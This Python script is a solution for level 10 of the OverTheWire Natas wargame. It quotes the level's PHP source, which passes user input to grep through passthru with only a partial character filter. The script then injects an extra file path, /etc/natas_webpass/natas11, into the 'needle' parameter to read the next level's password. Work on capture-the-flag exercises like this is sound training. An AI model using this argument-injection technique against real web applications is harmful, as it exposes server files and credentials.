import requests

import natas9
from helpers import between


def solution() -> str:
    url = "http://natas10.natas.labs.overthewire.org"
    username = "natas10"
    password = natas9.solution()

    # From "View sourcecode" link:
    # if($key != "") {
    #     if(preg_match('/[;|&]/',$key)) {
    #         print "Input contains an illegal character!";
    #     } else {
    #         passthru("grep -i $key dictionary.txt");
    #     }
    # }

    needle = "1 /etc/natas_webpass/natas11"
    params = {"needle": needle, "submit": "Search"}
    r = requests.get(url, auth=(username, password), params=params)
    start = "<pre>\n"
    end = "\n</pre>"
    filename_password = between(r.text, start, end)
    _, natas11_password = filename_password.split(":")
    return natas11_password
